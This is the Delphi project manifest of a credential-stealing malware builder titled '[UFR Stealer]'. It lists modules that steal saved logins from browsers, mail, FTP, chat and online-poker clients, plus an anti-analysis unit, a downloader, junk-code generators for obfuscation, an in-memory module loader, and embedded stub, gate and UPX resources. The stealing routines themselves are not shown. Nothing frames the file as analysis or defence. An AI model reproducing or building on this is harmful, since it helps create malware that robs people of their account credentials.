program config;

uses
  Forms,
  Unit3 in 'Unit3.pas' {Form3},
  GFX_About in 'GFX_About.pas' {Form2},
  JoinForm in 'JoinForm.pas' {Form6},
  FlashUseForm in 'FlashUseForm.pas' {Form7},
  GateUseForm in 'GateUseForm.pas' {Form8},
  FtpUseForm in 'FtpUseForm.pas' {Form9},
  VersionInfoEdit in 'VersionInfoEdit.pas' {Form1},
  DCPcrypt2 in 'DCPCrypt2\DCPcrypt2.pas',
  DCPconst in 'DCPCrypt2\DCPconst.pas',
  DCPblockciphers in 'DCPCrypt2\DCPblockciphers.pas',
  DCPdes in 'DCPCrypt2\Ciphers\DCPdes.pas',
  DCPbase64 in 'DCPCrypt2\DCPbase64.pas',
  DCPmd5 in 'DCPCrypt2\Hashes\DCPmd5.pas',
  DCPsha1 in 'DCPCrypt2\Hashes\DCPsha1.pas',
  DecryptorGeneracion in 'DecryptorGeneracion.pas',
  CRCunit in 'CRCunit.pas',
  Parser in 'Parser.pas',
  Stealer_WTC in 'Stealer_WTC.pas',
  Stealer_Opera in 'Stealer_Opera.pas',
  RESOURCES in 'RESOURCES.PAS',
  Stealer_MRA in 'Stealer_MRA.pas',
  DCPblowfish in 'DCPCrypt2\Ciphers\DCPblowfish.pas',
  Stealer_TheBat in 'Stealer_TheBat.pas',
  MailUseForm in 'MailUseForm.pas' {Form5},
  Stealer_SmartFTP in 'Stealer_SmartFTP.pas',
  Antis in 'Antis.pas' {Form12},
  Dloader in 'Dloader.pas' {Form13},
  trashgen_lib in 'STG\trashgen_lib.pas',
  ETG in 'ETG\ETG.pas',
  LDasm in 'LDasm\LDasm.pas',
  PwdProtectReportUseForm in 'PwdProtectReportUseForm.pas' {Form14},
  PwdEnterForm in 'PwdEnterForm.pas' {Form15},
  Stealer_Psi in 'Stealer_Psi.pas',
  Stealer_CoreFTP in 'Stealer_CoreFTP.pas',
  DCPrijndael in 'DCPCrypt2\Ciphers\DCPrijndael.pas',
  Stealer_WS_FTP in 'Stealer_WS_FTP.pas',
  Stealer_IncrediMail in 'Stealer_IncrediMail.pas',
  Stealer_FullTiltPoker in 'Stealer_FullTiltPoker.pas',
  Stealer_PokerStars in 'Stealer_PokerStars.pas',
  Stealer_WinSCP in 'Stealer_WinSCP.pas',
  CRC32 in 'CRC32.pas',
  SQLite3Lib in 'EmbeddedSQLite3\source\SQLite3Lib.pas',
  BTMemoryModule in 'BTMemoryModule\BTMemoryModule.pas',
  Stealer_FAR in 'Stealer_FAR.pas';

{$R *.res}
{$R W:\PROJECT_X\ASM\UFR_Stealer\Stub\stub.res}
{$R W:\PROJECT_X\ASM\UFR_Stealer\GateFiles\gate.res}
{$R W:\PROJECT_X\ASM\UFR_Stealer\help\help.res}
{$R W:\PROJECT_X\ASM\UFR_Stealer\upx_bin\upx.res}

begin
  Application.Initialize;
  Application.Title := '[UFR Stealer]';
  Application.CreateForm(TForm3, Form3);
  Application.Run;
end.
